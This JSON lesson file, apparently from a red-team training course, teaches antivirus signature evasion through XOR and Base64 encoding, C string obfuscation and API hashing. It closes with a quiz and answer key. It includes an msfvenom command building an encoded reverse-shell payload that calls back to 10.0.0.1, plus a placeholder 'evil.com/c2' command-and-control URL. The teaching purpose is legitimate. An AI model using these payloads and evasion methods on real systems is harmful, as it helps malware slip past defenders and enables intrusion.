@@ -1,0 +1,247 @@
+{
+    "lesson_id": "9c2b72f2-9d45-4989-97e4-8341a3f7ab8b",
+    "title": "Signature-Based AV Evasion",
+    "domain": "red_team",
+    "difficulty": 3,
+    "estimated_time": 45,
+    "order_index": 69,
+    "prerequisites": [],
+    "concepts": [
+        "Antivirus signature detection",
+        "Static analysis evasion",
+        "Encoding and encryption techniques",
+        "String obfuscation",
+        "Binary modification",
+        "Payload obfuscation",
+        "AV bypass methodology"
+    ],
+    "learning_objectives": [
+        "Understand how signature-based antivirus detection works and its limitations",
+        "Apply encoding and encryption techniques to evade static signature detection",
+        "Implement string obfuscation methods to hide malicious indicators",
+        "Modify binary artifacts to bypass known signature patterns",
+        "Develop a methodologyical approach to AV evasion testing"
+    ],
+    "content_blocks": [
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000001",
+            "type": "mindset_coach",
+            "title": "The Evasion Mindset",
+            "content": {
+                "text": "AV evasion isn't about being sneaky for its own sake — it's about understanding how defenses see you so you can test whether they actually work. Every evasion technique you learn makes you a better red teamer AND a better defender.\n\n**Jim Kwik Learning Principle: Connect to What I Know**\n\nThink of AV signatures like facial recognition at an airport. If you know exactly how the camera identifies you, you know exactly what to change. Evasion is applied understanding of detection."
+            },
+            "simplified_explanation": "Antivirus works like a bouncer with a photo book of known troublemakers. If you know the photos in the book, you can change your hairstyle, wear a hat, or put on glasses to not match any photo. That's evasion — understanding the detection method so you can avoid matching it.",
+            "memory_aids": [
+                "Signature AV = Photo book of known bad guys",
+                "Evasion = Change your look so you're not in the book",
+                "If you know how they see you, you know how to not be seen"
+            ],
+            "real_world_connection": "Penetration testers regularly need to demonstrate that signature-based AV alone is insufficient. A well-crafted evasion proves to stakeholders that layered defenses are necessary.",
+            "reflection_prompt": "Why would an organization that relies solely on signature-based AV be at risk?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000002",
+            "type": "explanation",
+            "title": "How Signature-Based Detection Works",
+            "content": {
+                "text": "## The Signature Model\n\nSignature-based antivirus detection is the oldest and most common method. It works by comparing files against a database of known malicious patterns (signatures).\n\n**How it works:**\n1. AV vendor discovers new malware → extracts unique byte patterns\n2. Signatures are added to definition database\n3. AV engine scans files, comparing against the signature database\n4. If a match is found → file is flagged/quarantined\n\n**Types of Signatures:**\n- **Fixed byte patterns**: Exact byte sequences at specific offsets\n- **Wild-card patterns**: Byte sequences with wildcard positions\n- **Hash-based**: MD5/SHA256 hashes of known malicious files\n- **PE section signatures**: Suspicious PE header or section characteristics\n\n**Key Limitation:** Signature detection is strictly reactive — it can only detect what it has already seen and cataloged."
+            },
+            "simplified_explanation": "Imagine a security guard with a photo album of known criminals. They check every person against the photos. If you're not in the album, you walk right past. Signature AV works the same way — it only catches malware it's already seen before.",
+            "memory_aids": [
+                "Signature = Known pattern match",
+                "Reactive only — can't catch what it hasn't seen",
+                "Three types: byte patterns, hashes, PE characteristics"
+            ],
+            "real_world_connection": "In 2024, signature-based AV typically detects only 40-60% of new malware samples. The rest slip through because their signatures aren't yet in any database.",
+            "reflection_prompt": "Why can't signature-based AV detect zero-day malware?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000003",
+            "type": "explanation",
+            "title": "Teach Me Like I'm 10: Signature Evasion",
+            "content": {
+                "text": "Imagine you have a secret code word that gets you into a club, but the bouncer has a list of all the code words that bad guys use.\n\n**The bouncer checks:**\n- Is your code word exactly on the list? (byte pattern match)\n- Does your code word have suspicious parts in it? (heuristic match)\n\n**To get past, you can:**\n1. **Encode your code word** — Write it backwards or in a different language. The bouncer can't read it!\n2. **Split it up** — Say half now, half later. The bouncer only checks what you say right now.\n3. **Disguise it** — Hide the code word inside a normal sentence.\n4. **Change it every time** — Use a different code word each visit so the bouncer's list is always outdated.\n\nThat's basically what malware evasion does — it changes what the bouncer can see!"
+            },
+            "simplified_explanation": "Evasion is like sneaking a note past a teacher who reads all notes. If you write the note in invisible ink, encode it as numbers, or split it across multiple pieces of paper, the teacher can't find the forbidden message even though they're reading everything.",
+            "memory_aids": [
+                "Encode = Write in a different language",
+                "Encrypt = Lock in a box, open only when needed",
+                "Obfuscate = Hide in plain sight"
+            ],
+            "real_world_connection": "Real malware like Emotet and Trickbot constantly change their appearance — sometimes every few hours — specifically to evade signature-based detection.",
+            "reflection_prompt": "If you were the bouncer and someone kept changing their disguise, what would you do differently?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000004",
+            "type": "explanation",
+            "title": "Encoding Techniques for Payload Evasion",
+            "content": {
+                "text": "## Encoding vs Encryption\n\n**Encoding** transforms data into a different representation without a secret key. It's reversible by anyone who knows the encoding scheme.\n\n**Common encoding techniques:**\n\n### 1. Base64 Encoding\n```\n# Original payload bytes\n\\xb8\\x01\\x00\\x00\\x00\\xcd\\x80\n\n# Base64 encoded\nuAEAAADNgA==\n```\n\n### 2. XOR Encoding\n```\n# XOR each byte with key 0x41\nOriginal: \\xb8\\x01\\x00\\x00\\x00\\xcd\\x80\nXOR'd:   \\xf9\\x40\\x41\\x41\\x41\\x8c\\xc1\n```\n\n### 3. Multi-layer Encoding\n```\n# Layer 1: XOR with key\n# Layer 2: Base64 encode\n# Layer 3: Reverse string\n# Decoder stub reverses the process at runtime\n```\n\n**Metasploit Encoder Example:**\n```bash\nmsfvenom -p linux/x86/shell_reverse_tcp \\\n  LHOST=10.0.0.1 LPORT=4444 \\\n  -e x86/shikata_ga_nai \\\n  -i 3 \\\n  -f elf -o payload.elf\n```\n\nThe `-i 3` flag applies the encoder 3 iterations, making each iteration change the payload's signature."
+            },
+            "simplified_explanation": "Encoding is like writing a message in pig Latin. The message is still there, but it looks different. XOR encoding flips every letter according to a pattern — like swapping A↔Z, B↔Y. The decoder reverses the pattern at the last second.",
+            "memory_aids": [
+                "Encoding = No secret key needed to reverse",
+                "XOR = Flip bits with a key pattern",
+                "Multi-layer = Encode the encoding for extra evasion",
+                "Shikata ga nai = Most popular Metasploit encoder"
+            ],
+            "real_world_connection": "Shikata ga nai (仕方がない) means 'it can't be helped' in Japanese. It's the most widely used encoder in Metasploit and has been effective against signature-based AV for years.",
+            "reflection_prompt": "Why doesn't encoding alone provide real security against a determined analyst?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000005",
+            "type": "code_exercise",
+            "title": "XOR Encoding Lab",
+            "content": {
+                "text": "## Exercise: Build a Custom XOR Encoder\n\nCreate a Python script that:\n1. Takes a payload string as input\n2. XOR encodes it with a single-byte key\n3. Outputs the encoded result\n4. Includes a decoder stub\n\n**Starter Code:**\n```python\ndef xor_encode(data: bytes, key: int) -> bytes:\n    \"\"\"XOR encode each byte with the key.\"\"\"\n    return bytes([b ^ key for b in data])\n\ndef xor_decode(data: bytes, key: int) -> bytes:\n    \"\"\"XOR decode — same operation as encode!\"\"\"\n    return bytes([b ^ key for b in data])\n\n# Test it\noriginal = b'\\xb8\\x01\\x00\\x00\\x00\\xcd\\x80'\nkey = 0x41\nencoded = xor_encode(original, key)\ndecoded = xor_decode(encoded, key)\n\nprint(f'Original: {original.hex()}')\nprint(f'Encoded:  {encoded.hex()}')\nprint(f'Decoded:  {decoded.hex()}')\nassert original == decoded, 'Decode failed!'\nprint('✓ Round-trip successful!')\n```\n\n**Challenge:** Modify the script to use a multi-byte key (e.g., `key = b'KEY'`) and cycle through the key bytes.",
+                "language": "python",
+                "starter_code": "def xor_encode(data: bytes, key: int) -> bytes:\n    return bytes([b ^ key for b in data])\n\ndef xor_decode(data: bytes, key: int) -> bytes:\n    return bytes([b ^ key for b in data])\n\noriginal = b'\\xb8\\x01\\x00\\x00\\x00\\xcd\\x80'\nkey = 0x41\nencoded = xor_encode(original, key)\ndecoded = xor_decode(encoded, key)\n\nprint(f'Original: {original.hex()}')\nprint(f'Encoded:  {encoded.hex()}')\nprint(f'Decoded:  {decoded.hex()}')\nassert original == decoded",
+                "solution": "def xor_encode_multi(data: bytes, key: bytes) -> bytes:\n    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])\n\ndef xor_decode_multi(data: bytes, key: bytes) -> bytes:\n    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])\n\noriginal = b'\\xb8\\x01\\x00\\x00\\x00\\xcd\\x80'\nkey = b'KEY'\nencoded = xor_encode_multi(original, key)\ndecoded = xor_decode_multi(encoded, key)\n\nprint(f'Original: {original.hex()}')\nprint(f'Encoded:  {encoded.hex()}')\nprint(f'Decoded:  {decoded.hex()}')\nassert original == decoded"
+            },
+            "xp_reward": 25
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000006",
+            "type": "real_world",
+            "title": "Real-World Evasion in Action",
+            "content": {
+                "text": "## Case Study: Emotet's Evasion Strategy\n\nEmotet, one of the most prolific malware families (2014-2022), used multiple signature evasion techniques:\n\n1. **Polymorphic code generation**: Every new build had different byte patterns\n2. **Multi-layer encoding**: Payloads encoded 3-5 times with different algorithms\n3. **Build-specific keys**: Each victim received a unique XOR key\n4. **Code obfuscation**: Junk instructions, control flow flattening\n5. **Anti-VM checks**: Refused to execute in sandbox environments\n\n**Results:** Emotet consistently bypassed 60-70% of AV engines on VirusTotal during its active campaigns.\n\n## Modern Evasion Landscape\n\n- **Living-off-the-Land (LotL)**: Using built-in Windows tools (PowerShell, WMI, certutil) instead of dropping custom binaries\n- **Fileless malware**: Operating entirely in memory, never touching disk\n- **Supply chain compromise**: Delivering through trusted software updates\n- **Macro-less document attacks**: Using DDE, LNK files instead of VBA macros\n\n**Key takeaway:** The most effective evasion isn't about hiding your payload — it's about not looking like a payload at all."
+            },
+            "simplified_explanation": "The best way to sneak past a bouncer isn't a disguise — it's walking in through the kitchen entrance while wearing a chef's uniform. Living-off-the-Land attacks use tools already on the target system, so AV doesn't flag them because they're legitimate programs.",
+            "memory_aids": [
+                "Polymorphic = Different every build",
+                "LotL = Use what's already there",
+                "Fileless = Never touch disk",
+                "Best evasion = Don't look like malware"
+            ],
+            "real_world_connection": "APT29 (Cozy Bear) famously used PowerShell and WMI — built-in Windows tools — to conduct their operations, making detection incredibly difficult because these tools are used legitimately thousands of times per day.",
+            "reflection_prompt": "How would you detect an attack that only uses legitimate system tools?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000007",
+            "type": "explanation",
+            "title": "String Obfuscation Techniques",
+            "content": {
+                "text": "## Why Obfuscate Strings?\n\nStrings like URLs, API names, and error messages are the first thing AV engines look for. If your payload contains `VirtualAllocEx` or `https://evil.com/c2`, signature detection will catch it immediately.\n\n### Technique 1: String Splitting\n```c\n// Bad — obvious string\nchar* url = \"https://evil.com/c2\";\n\n// Better — split and concatenate at runtime\nchar* url = (char*)malloc(22);\nstrcpy(url, \"https://evil\");\nstrcat(url, \".com/c2\");\n```\n\n### Technique 2: XOR String Encoding\n```c\n// Store XOR'd strings, decode at runtime\nchar encoded[] = {0x1d, 0x0c, 0x0c, 0x09, ...}; // \"cmd.exe\" XOR 0x05\nchar key = 0x05;\nfor (int i = 0; i < sizeof(encoded); i++) {\n    encoded[i] ^= key;\n}\n```\n\n### Technique 3: Stack String Construction\n```c\n// Build string character by character on the stack\nchar cmd[8];\ncmd[0] = 'c'; cmd[1] = 'm'; cmd[2] = 'd';\ncmd[3] = '.'; cmd[4] = 'e'; cmd[5] = 'x';\ncmd[6] = 'e'; cmd[7] = '\\0';\n```\n\n### Technique 4: Hash-based API Resolution\n```c\n// Instead of importing CreateProcessA by name,\n// resolve it by hash of the name\ntypedef BOOL (WINAPI *CreateProcess_t)(...);\nHMODULE hKernel32 = GetModuleHandleA(\"kernel32.dll\");\nCreateProcess_t pCreateProcess = \n    (CreateProcess_t)ResolveFunctionByHash(hKernel32, 0x...);\n```\n\nThis prevents the string `CreateProcessA` from appearing in your binary at all."
+            },
+            "simplified_explanation": "Imagine your diary has the word 'BOMB' written in it, and the teacher reads all diaries. You could write it as 'B-O-M-B' in separate entries, write it in code (shift each letter by 3), or write it one letter per page so it's never all in one place. String obfuscation does exactly this for malware.",
+            "memory_aids": [
+                "String splitting = Break it into pieces",
+                "XOR encoding = Scramble with a key",
+                "Stack strings = Build it at runtime, not in the file",
+                "API hashing = Call functions by number, not by name"
+            ],
+            "real_world_connection": "Cobalt Strike, one of the most popular commercial penetration testing tools, uses all of these string obfuscation techniques in its beacon payload to evade signature detection.",
+            "reflection_prompt": "Why is API hashing more effective than simple string splitting?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000008",
+            "type": "memory_aid",
+            "title": "Signature Evasion Cheat Sheet",
+            "content": {
+                "text": "## 🧠 Evasion Techniques Memory Map\n\n### **E**ncode → Transform bytes (XOR, Base64, ROT13)\n### **V**ault → Encrypt payloads, decrypt at runtime\n### **A**lter → Modify binary structure (PE headers, sections)\n### **S**plit → Break strings across code sections\n### **I**ndirect → Use API hashing instead of direct imports\n### **O**bfuscate → Junk code, control flow flattening\n### **N**ever-detectable → Fileless, in-memory only\n\n**Remember: EVASION**\n\n### Quick Reference:\n| Technique | Effective Against | Bypass Rate |\n|-----------|-------------------|-------------|\n| XOR Encoding | Static signatures | High |\n| Multi-layer Encoding | Static + heuristic | Very High |\n| String Obfuscation | String-based signatures | High |\n| API Hashing | Import-based detection | Very High |\n| Binary Modification | PE-based signatures | Medium-High |\n| Fileless Execution | File-based AV | Highest |\n| LotL Techniques | Most traditional AV | Highest |"
+            },
+            "simplified_explanation": "Remember EVASION: Encode, Vault (encrypt), Alter, Split, Indirect (API hash), Obfuscate, Never-write-to-disk. These are your seven main approaches to bypassing signature-based AV.",
+            "memory_aids": [
+                "EVASION = 7 techniques acronym",
+                "XOR → simple, API hashing → advanced",
+                "Fileless → hardest to detect",
+                "LotL → uses what's already there"
+            ],
+            "real_world_connection": "Professional red teamers typically combine 3-5 of these techniques. A common combo: encode payload + API hashing + in-memory execution = very hard to detect with signatures alone.",
+            "reflection_prompt": "Which EVASION technique would you start with and why?",
+            "is_interactive": false,
+            "xp_reward": 0
+        },
+        {
+            "block_id": "a1b2c3d4-0001-4000-8000-000000000009",
+            "type": "reflection",
+            "title": "Putting It All Together",
+            "content": {
+                "text": "## Reflection: Your Evasion Strategy\n\nNow that you understand signature-based AV and its weaknesses, think about how to build a comprehensive evasion approach:\n\n**Questions to consider:**\n1. Why is relying on any single evasion technique risky?\n2. What's the difference between evasion and encryption in the context of AV bypass?\n3. How does defense-in-depth (behavioral analysis, heuristics, sandboxing) counter these techniques?\n4. As a red teamer, how do you responsibly disclose evasion weaknesses to the blue team?\n\n**Key Insight:** The goal isn't to create undetectable malware — it's to demonstrate that signature-based AV alone is insufficient, and to advocate for layered defenses that include behavioral detection, memory scanning, and network analysis.\n\n**Next Steps:** In the next lesson (Behavior-Based AV Evasion), you'll learn how to deal with AV that watches what you DO, not just what you LOOK LIKE."
+            },
+            "simplified_explanation": "Signature evasion is just one layer. Real red teaming requires understanding how all defenses work together — and helping the blue team improve their detection. You're not building malware to be a criminal; you're testing defenses to make them stronger.",
+            "memory_aids": [
+                "Single technique = single point of failure",
+                "Evasion ≠ Encryption (encryption has keys, encoding doesn't)",
+                "Red team goal = prove defenses need improvement",
+                "Behavior-based detection → next lesson"
+            ],
+            "real_world_connection": "The MITRE ATT&CK framework documents evasion techniques with IDs T1027 (Obfuscated Files), T1140 (Deobfuscate/Decode Files), T1055 (Process Injection) — these help both red and blue teams understand and counter evasion.",
+            "reflection_prompt": "If you were building a defense stack, what would you add beyond signature-based AV?",
+            "is_interactive": false,
+            "xp_reward": 0
+        }
+    ],
+    "post_assessment": [
+        {
+            "question": "What is the fundamental limitation of signature-based antivirus detection?",
+            "options": [
+                "It requires too much CPU resources to scan files",
+                "It can only detect malware that has been previously identified and cataloged",
+                "It cannot scan files larger than 100MB",
+                "It only works on Windows operating systems"
+            ],
+            "correct_answer": 1,
+            "explanation": "Signature-based detection relies entirely on a database of known malicious patterns. It cannot detect zero-day or previously unseen malware because there's no signature to match against."
+        },
+        {
+            "question": "When using XOR encoding to evade signature detection, what is a key characteristic of the encoding process?",
+            "options": [
+                "XOR encoding adds significant overhead to the payload size",
+                "XOR encoding is irreversible without the original key",
+                "The same XOR operation both encodes and decodes (self-inverse property)",
+                "XOR encoding only works on ASCII characters"
+            ],
+            "correct_answer": 2,
+            "explanation": "XOR is a self-inverse operation: A XOR B XOR B = A. This means the same function that encodes can also decode, making it simple to implement but also simple to reverse if the key is known."
+        },
+        {
+            "question": "Why is API hashing (resolving functions by hash instead of name) effective against signature-based AV?",
+            "options": [
+                "It makes the binary run faster by avoiding import table lookups",
+                "It prevents the function name strings from appearing in the binary's import table",
+                "It encrypts the API calls so they can't be monitored at runtime",
+                "It changes the API function signatures to avoid detection"
+            ],
+            "correct_answer": 1,
+            "explanation": "API hashing resolves function addresses at runtime by computing a hash of the function name, then looking it up in the export table. This prevents suspicious API names like 'VirtualAllocEx' or 'CreateRemoteThread' from appearing in the import table where signature-based AV would detect them."
+        },
+        {
+            "question": "Which evasion technique is MOST effective against traditional file-based antivirus?",
+            "options": [
+                "String obfuscation in the binary",
+                "Multi-layer XOR encoding",
+                "Fileless execution that never writes to disk",
+                "PE header modification"
+            ],
+            "correct_answer": 2,
+            "explanation": "Fileless malware operates entirely in memory without creating files on disk. Traditional file-based AV relies on scanning files, so if there's no file to scan, signature detection is bypassed entirely."
+        },
+        {
+            "question": "A red teamer generates a payload with msfvenom using shikata_ga_nai encoder with 5 iterations (-i 5). What does each iteration do?",
+            "options": [
+                "Adds 5 new exploit modules to the payload",
+                "Increases the payload size by 5x for better obfuscation",
+                "Applies the encoder transformation 5 times, each time changing the payload's byte signature",
+                "Creates 5 separate decoy payloads as distractions"
+            ],
+            "correct_answer": 2,
+            "explanation": "Each iteration of the shikata_ga_nai encoder applies the XOR-based polymorphic transformation again, producing a payload with a different byte signature each time. This significantly changes the binary pattern between iterations, making signature detection harder."
+        }
+    ],
+    "jim_kwik_principles": ["teach_like_im_10", "memory_hooks", "connect_to_what_i_know", "active_learning", "meta_learning", "minimum_effective_dose", "reframe_limiting_beliefs", "gamify_it", "learning_sprint", "multiple_memory_pathways"],
+    "tags": ["Course: OffSec-PEN300", "Career Path: Red Teamer", "AV Evasion", "Obfuscation", "Red Team Ops"]
+}
